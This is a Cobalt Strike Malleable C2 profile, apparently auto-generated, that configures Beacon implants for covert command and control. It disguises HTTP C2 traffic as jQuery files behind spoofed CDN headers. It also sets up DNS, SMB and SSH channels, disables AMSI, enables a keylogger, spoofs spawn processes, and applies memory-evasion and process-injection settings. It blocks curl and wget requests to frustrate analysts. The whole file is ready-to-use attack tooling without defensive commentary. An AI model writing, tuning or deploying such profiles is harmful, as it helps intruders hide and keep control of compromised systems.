################################################
# Cobalt Strike Malleable C2 Profile
# Version: Cobalt Strike 4.5
# Date   : 20220219_1014

################################################
## Profile Name
################################################
set sample_name "YKOACGGV";

################################################
## Sleep Times
################################################
set sleeptime "1653";         
set jitter    "1";           

################################################
##  Server Response Size jitter
################################################
set data_jitter "113"; # Append random-length string (up to data_jitter value) to http-get and http-post server output.        

################################################
##  HTTP Client Header Removal
################################################
# set headers_remove "Strict-Transport-Security"; # Comma-separated list of HTTP client headers to remove from Beacon C2.

################################################
## Beacon User-Agent
################################################
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/2008102920 Firefox/60.0";

################################################
## SSL CERTIFICATE
################################################
https-certificate { # Simple self signed certificate data
    
    set C   "JO";
    set CN  "v7.69.net";
    set O   "com3";
    set OU  "maps corp";
    set validity "365";
}

################################################
## TCP Beacon
################################################
set tcp_port "49445"; # TCP beacion listen port
set tcp_frame_header "\xd3\xf5\xd5\xdc\xd3\xb5\xe9\x7f\xe3\xd1\xb7\xb2\x75\x59\x81"; # Prepend header to TCP Beacon messages

################################################
## SMB beacons
################################################
set pipename         "Winsock2\\CatalogChangeListener-PXGY###-1"; # Name of pipe for SSH sessions. Each # is replaced with a random hex value.
set pipename_stager  "WiFiNetMgrXORP_##"; # Name of pipe to use for SMB Beacon's named pipe stager. Each # is replaced with a random hex value.
set smb_frame_header "\x92\xec\xc1\x97\x87\xc5\xd2\xfb\x95\xd7\xad\xa3"; # Prepend header to SMB Beacon messages

################################################
## DNS beacons
################################################
dns-beacon {
    # Options moved into "dns-beacon" group in version 4.3
    set dns_idle           "179.251.233.15"; # IP address used to indicate no tasks are available to DNS Beacon; Mask for other DNS C2 values
    set dns_max_txt        "252"; # Maximum length of DNS TXT responses for tasks
    set dns_sleep          "16"; # Force a sleep prior to each individual DNS request. (in milliseconds) 
    set dns_ttl            "2"; # TTL for DNS replies
    set maxdns             "240"; # Maximum length of hostname when uploading data over DNS (0-255)
    set dns_stager_prepend ".o0cq0f5."; # Maximum length of hostname when uploading data over DNS (0-255)
    set dns_stager_subhost ".22l8y."; # Subdomain used by DNS TXT record stager.
    set beacon             "szu83."; # 8 Char max recommended. DNS subhost prefix
    set get_A              "uvovlhl."; # 8 Char max recommended. DNS subhost prefix
    set get_AAAA           "a6xc1dn."; # 8 Char max recommended. DNS subhost prefix
    set get_TXT            "rj614."; # 8 Char max recommended. DNS subhost prefix
    set put_metadata       "k."; # 8 Char max recommended. DNS subhost prefix
    set put_output         "36n7mi."; # 8 Char max recommended. DNS subhost prefix
    set ns_response        "zero"; # How to process NS Record requests. "drop" does not respond to the request (default), "idle" responds with A record for IP address from "dns_idle", "zero" responds with A record for 0.0.0.0

}

################################################
## SSH beacons
################################################
set ssh_banner        "SSH-2.0-OpenSSH_4.6p6 CentOS"; # SSH client banner
set ssh_pipename      "AuthPipeAMLS_##"; # Name of pipe for SSH sessions. Each # is replaced with a random hex value.


################################################
## Staging process
################################################
set host_stage "true"; 

http-stager { # Reference: https://www.cobaltstrike.com/help-malleable-c2
    set uri_x86 "/derive/jsFiles/Z53950NY"; # URI for x86 staging
    set uri_x64 "/build/v1.67/1KJJDNCRYQVA"; # URI for x64 staging

    server {
        header "Server" "AkamaiGHost";
        header "Cache-Control" "max-age=0, no-cache";
        header "Pragma" "no-cache";
        header "Connection" "keep-alive";
        header "Content-Type" "application/json; charset=utf-8";
        output {
            prepend "/*! jQuery UI - v1.12.1 - 2016-09-14    * http://jqueryui.com    * Includes: widget.js, position.js,    data.js, disable-selection.js, effect.js, effects/effect-blind.js, effects/effect-bounce.js    , effects/effect-clip.js, effects/effect-drop.js, effects/effect-explode.js, effects/effect    -fade.js, effects/effect-fold.js, effects/effect-highlight.js, effects/effect-puff.js, effe    cts/effect-pulsate.js, effects/effect-scale.js, effects/effect-shake.js, effects/effect-s    ize.js, effects/effect-slide.js, effects/effect-transfer.js, focusable.js, form-reset-mix    in.js, jquery-1-7.js, keycode.js, labels.js, scroll-parent.js, tabbable.js, unique-id.js,    widgets/accordion.js, widgets/autocomplete.js, widgets/button.js, widgets/checkboxradio.    js, widgets/controlgroup.js, widgets/datepicker.js, widgets/dialog.js, widgets/draggable    .js, widgets/droppable.js, widgets/menu.js, widgets/mouse.js, widgets/progressbar.js, w    idgets/resizable.js, widgets/selectable.js, widgets/selectmenu.js, widgets/slider.js, w    idgets/sortable.js, widgets/spinner.js, widgets/tabs.js, widgets/tooltip.js    * Copyright jQuery Foundation and other contributors; Licensed MIT */";
            append "/*! jQuery v2.2.4 | (c) jQuery Foundation | jquery.org/license */    !function(a,b){'object'==typeof module&&'object'==typeof module.exp    orts?module.exports=a.document?b(a,!0):function(a){if(!a.document)th    row new Error('jQuery requires a window with a document');return b(a    )}:b(a)}('undefined'!=typeof window?window:this,function(a,b){var c=    [],d=a.document,e=c.slice,f=c.concat,g=c.push,h=c.indexOf,i={},j=i.t    oString,k=i.hasOwnProperty,l={},m='2.2.4',n=function(a,b){return new     n.fn.init(a,b)},o=/^[suFEFFxA0]+|[suFEFFxA0]+$/g,p=/^-ms-/,q=/-    ([da-z])/gi,r=function(a,b){return b.toUpperCase()};n.fn=n.prototype    ={jquery:m,constructor:n,selector:'',length:0,toArray:function(){retu    rn e.call(this)},get:function(a){return null!=a?0>a?this[a+this.lengt    h]:this[a]:e.call(this)},pushStack:function(a){var b=n.merge(this.con    structor(),a);return b.prevObject=this,b.context=this.context,b},each:";
            print;
            
        }
    }

    client {
        header "Accept" "application/xml, image/*, application/xhtml+xml";
        header "Accept-Language" "ur";
        header "Accept-Encoding" "gzip, compress";
    }
}

################################################
## Post Exploitation
################################################
post-ex { # Reference: https://www.cobaltstrike.com/help-malleable-postex
    set spawnto_x86 "%windir%\\syswow64\\DevicePairingWizard.exe";
    set spawnto_x64 "%windir%\\sysnative\\gpupdate.exe";
    set obfuscate "true";
    set smartinject "true";
    set amsi_disable "true";
    set pipename "ProtectionManager_##, Winsock2\\CatalogChangeListener-##-##, Spool\\pipe_##, WkSvcPipeMgr_##, NetClient_##, RPC_##, WiFiNetMgr_##, AuthPipeD_##";
    set keylogger "GetAsyncKeyState"; # options are GetAsyncKeyState or SetWindowsHookEx
    #set thread_hint ""; # specify as module!function+0x##
}


################################################
## Memory Indicators
################################################
stage { # https://www.cobaltstrike.com/help-malleable-postex
    # allocator and RWX settings (Note: HealAlloc uses RXW)
    
    set allocator      "HeapAlloc";
    set userwx         "true";
     
    set magic_mz_x86   "MEME";
    set magic_mz_x64   "AYAQ";
    set magic_pe       "RY";
    set stomppe        "true";
    set obfuscate      "true"; # review sleepmask and UDRL considerations for obfuscate
    set cleanup        "true";
    set sleep_mask     "true";
    set smartinject    "true";
    set checksum       "0";
    set compile_time   "27 Oct 2011 17:10:44";
    set entry_point    "708351";
    set image_size_x86 "551900";
    set image_size_x64 "536781";
    set name           "bots.dll";
    set rich_header    "\x44\x61\x61\x53\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xee\x70\x90\x74\xf1\x67\x8f\xa4\xd1\xf8\x8e\xe3\x50\xd8\x69\x79\x6c\xdf\xcc\xc7\x59\xfd\x7a\x8b\xec\x56\x69\x79\x92\x62\x75\x89\xac\xdd\xd9\xd0\x6e\x69\xe6\x5b\x70\xf9\x59\xb9\x7f\x96\x73\xa5\xbb\x63\x91\xfc\xbe\xff\xd0\x69\x76\x71\x7e\x57\x97\x8a\xe6\xe6\x79\xaf\xe7\xda\xf5\xde\x75\x73\x52\x69\x63\x68\x7a\xf9\x90\x26\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";

    ## WARNING: Module stomping 
    # set module_x86 "netshell.dll"; # Ask the x86 ReflectiveLoader to load the specified library and overwrite its space instead of allocating memory with VirtualAlloc.
    # set module_x64 "netshell.dll"; # Same as module_x86; affects x64 loader

    # The transform-x86 and transform-x64 blocks pad and transform Beacon's Reflective DLL stage. These blocks support three commands: prepend, append, and strrep.
    transform-x86 { # blocks pad and transform Beacon's Reflective DLL stage. These blocks support three commands: prepend, append, and strrep.
        prepend "\x0f\x1f\x84\x00\x00\x00\x00\x00\x50\x58\x0f\x1f\x80\x00\x00\x00\x00\x0f\x1f\x84\x00\x00\x00\x00\x00\x0f\x1f\x80\x00\x00\x00\x00\x0f\x1f\x00\x0f\x1f\x80\x00\x00\x00\x00\x0f\x1f\x40\x00\x66\x90\x66\x90\x66\x0f\x1f\x44\x00\x00\x50\x58\x50\x58\x0f\x1f\x44\x00\x00\x66\x90\x50\x58\x66\x0f\x1f\x84\x00\x00\x00\x00\x00\x66\x90"; # prepend nops
        strrep "ReflectiveLoader" "v9.09";
        strrep "This program cannot be run in DOS mode" ""; # Remove this text
        strrep "beacon.dll" ""; # Remove this text
    }
    transform-x64 { #blocks pad and transform Beacon's Reflective DLL stage. These blocks support three commands: prepend, append, and strrep.
        prepend "\x0f\x1f\x44\x00\x00\x50\x58\x66\x0f\x1f\x84\x00\x00\x00\x00\x00\x66\x0f\x1f\x84\x00\x00\x00\x00\x00\x0f\x1f\x44\x00\x00\x0f\x1f\x40\x00\x50\x58\x0f\x1f\x40\x00\x66\x0f\x1f\x44\x00\x00\x0f\x1f\x80\x00\x00\x00\x00\x0f\x1f\x44\x00\x00\x0f\x1f\x44\x00\x00\x0f\x1f\x40\x00"; # prepend nops
        strrep "ReflectiveLoader" "v6.96";
        strrep "beacon.x64.dll" ""; # Remove this text in the Beacon DLL
    }

    stringw "YKOACGGV"; # Add profile name to tag payloads to this profile
}

################################################
## Process Injection
################################################
process-inject { # Reference: https://www.cobaltstrike.com/help-malleable-postex

    set allocator "VirtualAllocEx"; # Options: VirtualAllocEx, NtMapViewOfSection 
    set min_alloc "7839"; # 	Minimum amount of memory to request for injected content
    set startrwx "false"; # Use RWX as initial permissions for injected content. Alternative is RW.
    
    # review sleepmask and UDRL considerations for userwx
    set userwx   "false"; # Use RWX as final permissions for injected content. Alternative is RX.

    transform-x86 { 
        # Make sure that prepended data is valid code for the injected content's architecture (x86, x64). The c2lint program does not have a check for this.
        prepend "\x0f\x1f\x00\x0f\x1f\x84\x00\x00\x00\x00\x00\x66\x0f\x1f\x44\x00\x00\x66\x0f\x1f\x84\x00\x00\x00\x00\x00\x66\x90\x0f\x1f\x84\x00\x00\x00\x00\x00\x66\x0f\x1f\x84\x00\x00\x00\x00\x00\x0f\x1f\x00\x66\x0f\x1f\x84\x00\x00\x00\x00\x00\x66\x90\x66\x90\x0f\x1f\x40\x00";
        append "\x66\x0f\x1f\x84\x00\x00\x00\x00\x00\x66\x90\x0f\x1f\x00\x66\x0f\x1f\x44\x00\x00\x50\x58\x0f\x1f\x40\x00\x90\x0f\x1f\x44\x00\x00\x0f\x1f\x84\x00\x00\x00\x00\x00\x66\x0f\x1f\x44\x00\x00";
    }

    transform-x64 {
        # Make sure that prepended data is valid code for the injected content's architecture (x86, x64). The c2lint program does not have a check for this.
        prepend "\x50\x58\x0f\x1f\x80\x00\x00\x00\x00\x66\x0f\x1f\x84\x00\x00\x00\x00\x00\x90\x66\x0f\x1f\x44\x00\x00\x0f\x1f\x40\x00\x0f\x1f\x84\x00\x00\x00\x00\x00\x66\x90\x0f\x1f\x40\x00\x50\x58";
        append "\x0f\x1f\x80\x00\x00\x00\x00\x66\x0f\x1f\x84\x00\x00\x00\x00\x00\x0f\x1f\x40\x00\x0f\x1f\x44\x00\x00\x0f\x1f\x44\x00\x00\x66\x0f\x1f\x84\x00\x00\x00\x00\x00\x0f\x1f\x44\x00\x00\x0f\x1f\x84\x00\x00\x00\x00\x00\x66\x90\x0f\x1f\x00\x0f\x1f\x40\x00";
    }
  
    execute {
        # The execute block controls the methods Beacon will use when it needs to inject code into a process. Beacon examines each option in the execute block, determines if the option is usable for the current context, tries the method when it is usable, and moves on to the next option if code execution did not happen. 
        
        CreateThread "ntdll!RtlUserThreadStart+0x813";
        CreateThread;
        NtQueueApcThread-s;
        CreateRemoteThread;
        RtlCreateUserThread; 
    
    }
}

################################################
## HTTP Headers
################################################
http-config { # The http-config block has influence over all HTTP responses served by Cobalt Strike’s web server. 
    set headers "Date, Server, Content-Length, Keep-Alive, Connection, Content-Type";
    header "Server" "ESF";
    header "Keep-Alive" "timeout=10, max=100";
    header "Connection" "Keep-Alive";
    # Use this option if your teamserver is behind a redirector
    set trust_x_forwarded_for "true";
    # Block Specific User Agents with a 404 (added in 4.3)
    set block_useragents "curl*,lynx*,wget*";
    # Allow Specific User Agents (added in 4.4);
    # allow_useragents ""; (if specified, block_useragents will take precedence)
}

################################################
## HTTP GET
################################################
http-get { # Don't think of this in terms of HTTP POST, as a beacon transaction of pushing data to the server

    set uri "/Forge/static/HULNWCWI"; # URI used for GET requests
    set verb "GET"; 

    client {

        header "Accept" "text/html, application/xml, application/xhtml+xml";
        header "Accept-Language" "sl";
        header "Accept-Encoding" "br, identity";

        metadata {
            mask; # Transform type
            netbiosu; # Transform type
            prepend "secure_id_BJX2ZRURZZDIG7F5DO="; # Cookie value
            header "Cookie";                                  # Cookie header
        }
    }

    server {

        header "Server" "cloudflare";
        header "Cache-Control" "max-age=0, no-cache";
        header "Pragma" "no-cache";
        header "Connection" "keep-alive";
        header "Content-Type" "plain/text; charset=utf-8";
        output {
            mask; # Transform type
            netbios; # Transform type
            prepend "/*! jQuery v3.4.1 | (c) JS Foundation and other contributors | jquery.org/license */    !function(e,t){'use strict';'object'==typeof module&&'object'==typeof module.exports?    module.exports=e.document?t(e,!0):function(e){if(!e.document)throw new Error('jQuery     requires a window with a document');return t(e)}:t(e)}('undefined'!=typeof window?window    :this,function(C,e){'use strict';var t=[],E=C.document,r=Object.getPrototypeOf,s=t.slice    ,g=t.concat,u=t.push,i=t.indexOf,n={},o=n.toString,v=n.hasOwnProperty,a=v.toString,l=    a.call(Object),y={},m=function(e){return'function'==typeof e&&'number'!=typeof e.nodeType}    ,x=function(e){return null!=e&&e===e.window},c={type:!0,src:!0,nonce:!0,noModule:!0};fun    ction b(e,t,n){var r,i,o=(n=n||E).createElement('script');if(o.text=e,t)for(r in c)(i=t[    r]||t.getAttribute&&t.getAttribute(r))&&o.setAttribute(r,i);n.head.appendChild(o).parentNode;";
            append "/*! jQuery UI - v1.12.1 - 2016-09-14    * http://jqueryui.com    * Includes: widget.js, position.js,    data.js, disable-selection.js, effect.js, effects/effect-blind.js, effects/effect-bounce.js    , effects/effect-clip.js, effects/effect-drop.js, effects/effect-explode.js, effects/effect    -fade.js, effects/effect-fold.js, effects/effect-highlight.js, effects/effect-puff.js, effe    cts/effect-pulsate.js, effects/effect-scale.js, effects/effect-shake.js, effects/effect-s    ize.js, effects/effect-slide.js, effects/effect-transfer.js, focusable.js, form-reset-mix    in.js, jquery-1-7.js, keycode.js, labels.js, scroll-parent.js, tabbable.js, unique-id.js,    widgets/accordion.js, widgets/autocomplete.js, widgets/button.js, widgets/checkboxradio.    js, widgets/controlgroup.js, widgets/datepicker.js, widgets/dialog.js, widgets/draggable    .js, widgets/droppable.js, widgets/menu.js, widgets/mouse.js, widgets/progressbar.js, w    idgets/resizable.js, widgets/selectable.js, widgets/selectmenu.js, widgets/slider.js, w    idgets/sortable.js, widgets/spinner.js, widgets/tabs.js, widgets/tooltip.js    * Copyright jQuery Foundation and other contributors; Licensed MIT */";
            print;
        }

    }
}

################################################
## HTTP POST
################################################
http-post { # Don't think of this in terms of HTTP POST, as a beacon transaction of pushing data to the server

    set uri "/Def/redirect/HZCHHXO06"; # URI used for POST block. 
    set verb "POST"; # HTTP verb used in POST block. Can be GET or POST

    client {

        header "Accept" "text/html, application/xml, application/json";
        header "Accept-Language" "en-nz";
        header "Accept-Encoding" "compress, br";
       
        id {
            mask; # Transform type
            netbios; # Transform type
            parameter "_FRRGQPJX";            
        }
              
        output {
            mask; # Transform type
            netbiosu; # Transform type
            print;
        }
    }

    server {

        header "Server" "cloudflare";
        header "Cache-Control" "max-age=0, no-cache";
        header "Pragma" "no-cache";
        header "Connection" "keep-alive";
        header "Content-Type" "application/javascript; charset=utf-8";

        output {
            mask; # Transform type
            base64url; # Transform type
            prepend "/*! jQuery UI - v1.12.1 - 2016-09-14    * http://jqueryui.com    * Includes: widget.js, position.js,    data.js, disable-selection.js, effect.js, effects/effect-blind.js, effects/effect-bounce.js    , effects/effect-clip.js, effects/effect-drop.js, effects/effect-explode.js, effects/effect    -fade.js, effects/effect-fold.js, effects/effect-highlight.js, effects/effect-puff.js, effe    cts/effect-pulsate.js, effects/effect-scale.js, effects/effect-shake.js, effects/effect-s    ize.js, effects/effect-slide.js, effects/effect-transfer.js, focusable.js, form-reset-mix    in.js, jquery-1-7.js, keycode.js, labels.js, scroll-parent.js, tabbable.js, unique-id.js,    widgets/accordion.js, widgets/autocomplete.js, widgets/button.js, widgets/checkboxradio.    js, widgets/controlgroup.js, widgets/datepicker.js, widgets/dialog.js, widgets/draggable    .js, widgets/droppable.js, widgets/menu.js, widgets/mouse.js, widgets/progressbar.js, w    idgets/resizable.js, widgets/selectable.js, widgets/selectmenu.js, widgets/slider.js, w    idgets/sortable.js, widgets/spinner.js, widgets/tabs.js, widgets/tooltip.js    * Copyright jQuery Foundation and other contributors; Licensed MIT */";
            append "/*! jQuery v2.2.4 | (c) jQuery Foundation | jquery.org/license */    !function(a,b){'object'==typeof module&&'object'==typeof module.exp    orts?module.exports=a.document?b(a,!0):function(a){if(!a.document)th    row new Error('jQuery requires a window with a document');return b(a    )}:b(a)}('undefined'!=typeof window?window:this,function(a,b){var c=    [],d=a.document,e=c.slice,f=c.concat,g=c.push,h=c.indexOf,i={},j=i.t    oString,k=i.hasOwnProperty,l={},m='2.2.4',n=function(a,b){return new     n.fn.init(a,b)},o=/^[suFEFFxA0]+|[suFEFFxA0]+$/g,p=/^-ms-/,q=/-    ([da-z])/gi,r=function(a,b){return b.toUpperCase()};n.fn=n.prototype    ={jquery:m,constructor:n,selector:'',length:0,toArray:function(){retu    rn e.call(this)},get:function(a){return null!=a?0>a?this[a+this.lengt    h]:this[a]:e.call(this)},pushStack:function(a){var b=n.merge(this.con    structor(),a);return b.prevObject=this,b.context=this.context,b},each:";
            print;

        }
    }
}
